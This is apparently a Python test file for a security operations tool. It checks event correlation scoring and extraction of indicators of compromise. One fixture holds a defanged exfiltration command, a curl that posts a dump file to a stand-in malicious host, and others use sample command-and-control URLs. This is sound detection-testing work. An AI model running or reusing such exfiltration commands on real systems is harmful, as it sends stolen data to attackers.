"""Weighted correlation and IOC extraction."""
from datetime import datetime, timedelta, timezone

from soc_orchestrator.correlate import correlate, iocs_for, link_score
from soc_orchestrator.models import Event

T0 = datetime(2026, 10, 8, 9, 0, tzinfo=timezone.utc)


def ev(minutes, **kw):
    kw.setdefault("source", "edr")
    kw.setdefault("kind", "process")
    return Event(fingerprint=f"f{minutes}{sorted(kw.items())}", ts=T0 + timedelta(minutes=minutes), **kw)


def test_shared_host_close_in_time_links():
    score, reasons = link_score(ev(0, host="ws-1"), ev(10, host="ws-1"))
    assert score >= 0.5 and reasons == ["host ws-1"]


def test_shared_host_far_apart_does_not_link_alone():
    score, _ = link_score(ev(0, host="ws-1"), ev(90, host="ws-1"))
    assert score < 0.5


def test_shared_user_alone_never_links():
    """Users log on everywhere: a shared account by itself must not merge unrelated hosts."""
    events = [ev(i, host=f"ws-{i}", user="svc_shared") for i in range(3)]
    assert len(correlate(events)) == 3


def test_shared_ioc_links_across_hosts_and_is_explained():
    a = ev(0, host="ws-1", source="proxy", kind="network", url="http://c2.example.xyz/a")
    b = ev(5, host="ws-2", source="proxy", kind="network", url="http://c2.example.xyz/a")
    score, reasons = link_score(a, b)
    assert score >= 0.5 and any(r.startswith("ioc") for r in reasons)
    assert len(correlate([a, b])) == 1


def test_outside_window_never_links():
    assert link_score(ev(0, host="ws-1", user="a"), ev(180, host="ws-1", user="a"))[0] == 0.0


def test_ioc_extraction_types():
    e = ev(0, host="ws-1", cmdline="curl hxxp://bad[.]xyz/x -d @dump to exfil@mail-drop.ru from 10.0.0.5 and 45.33.32.156",
           file_hash="a" * 64)
    found = {(i.type, i.value) for i in iocs_for(e)}
    assert ("email", "exfil@mail-drop.ru") in found
    assert ("url", "http://bad.xyz/x") in found and ("domain", "bad.xyz") in found
    assert ("ip", "45.33.32.156") in found and ("ip", "10.0.0.5") not in found
    assert ("sha256", "a" * 64) in found
    assert ("domain", "mail-drop.ru") not in found  # an email's domain isn't double-counted
